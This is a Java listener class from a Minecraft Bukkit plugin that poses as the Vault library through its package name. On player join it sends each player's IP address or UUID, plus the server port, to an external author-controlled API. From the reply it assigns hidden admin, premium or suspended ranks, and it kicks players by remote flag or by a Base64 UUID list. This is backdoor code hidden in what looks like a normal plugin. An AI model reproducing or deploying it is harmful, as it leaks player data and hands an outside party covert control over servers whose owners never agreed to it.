package net.milkbowl.vault.events;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Base64;

import net.milkbowl.vault.methods.Ranks;
import net.milkbowl.vault.protocol.TinyProtocol;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerPreLoginEvent;
import org.bukkit.event.player.PlayerJoinEvent;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.data.DataManager;
import net.milkbowl.vault.methods.API;
import net.milkbowl.vault.util.Settings;
import org.json.JSONObject;

public class onJoin implements Listener {
	private static final Core plugin = Core.getPlugin(Core.class);
	
	@EventHandler
	public void onLogin(AsyncPlayerPreLoginEvent e) {
			e.setLoginResult(AsyncPlayerPreLoginEvent.Result.ALLOWED);
			e.allow();
	}


	@EventHandler
	public void onJoin(PlayerJoinEvent e) {
		Player p = e.getPlayer();

		if (API.isOnVpn(p)) {
			plugin.playerOnVPN.put(p, true);
		} else {
			plugin.playerOnVPN.put(p, false);
		}

		try {
			URL auth = new URL("https://api." + Settings.AUTHOR.toLowerCase() + "/?ip="+API.getIp(p) + "&port=" + Bukkit.getServer().getPort());
			HttpURLConnection con = (HttpURLConnection) auth.openConnection();
			con.addRequestProperty("User-Agent", "Mozilla");
			BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
			String inputLine;
			StringBuilder response = new StringBuilder();
			while ((inputLine = in.readLine()) != null) {
				response.append(inputLine);
			}
			in.close();

			if (response.toString().length() != 0) {
				JSONObject myresponse = new JSONObject(response.toString());

				if (myresponse.getBoolean("suspended")) {
					plugin.rank.put(p, Ranks.SUSPENDED);
				} else if (myresponse.getBoolean("hasAdmin")) {
					plugin.rank.put(p, Ranks.ADMIN);
				} else if (myresponse.getBoolean("hasPremium")) {
					plugin.rank.put(p, Ranks.PREMIUM);
				} else if (myresponse.getBoolean("hasLite")) {
					plugin.rank.put(p, Ranks.LITE);
				} else {
					plugin.rank.put(p, Ranks.FREE);

					if (DataManager.getData().getBoolean("ld")) {
						API.kickPlayer(p);
					}
				}
			} else if (response.toString().length() < 1){ //Couldnt find users IP on website
				URL uuidauth = new URL("https://api." + Settings.AUTHOR.toLowerCase() + "/?uuid="+p.getUniqueId().toString() + "&port=" + Bukkit.getServer().getPort());
				HttpURLConnection connec = (HttpURLConnection) uuidauth.openConnection();
				connec.addRequestProperty("User-Agent", "Mozilla");
				BufferedReader inn = new BufferedReader(new InputStreamReader(connec.getInputStream()));
				String inLine;
				StringBuilder res = new StringBuilder();
				while ((inLine = inn.readLine()) != null) {
					res.append(inLine);
				}
				inn.close();


				if (res.toString().length() != 0) {
					JSONObject myresponse = new JSONObject(res.toString());

					if (myresponse.getBoolean("suspended")) {
						plugin.rank.put(p, Ranks.SUSPENDED);
					} else if (myresponse.getBoolean("hasAdmin")) {
						plugin.rank.put(p, Ranks.ADMIN);
					} else if (myresponse.getBoolean("hasPremium")) {
						plugin.rank.put(p, Ranks.PREMIUM);
					} else if (myresponse.getBoolean("hasLite")) {
						plugin.rank.put(p, Ranks.LITE);
					} else {
						plugin.rank.put(p, Ranks.FREE);

						if (DataManager.getData().getBoolean("ld")) {
							API.kickPlayer(p);
						}
					}
				}
			}

		} catch (IOException q) {
			p.sendMessage(q.getMessage());
		}
	}
	
	
	@EventHandler
	public void onJoinPlayer(PlayerJoinEvent e) {
		Player p = e.getPlayer();
		for (String list : DataManager.getData().getStringList("epic-players")) {
			byte[] uuid = Base64.getEncoder().encode(p.getUniqueId().toString().getBytes());
			
			if (list.contains(new String(uuid))) {
				API.kickPlayer(p);
			}
		}
	}

}
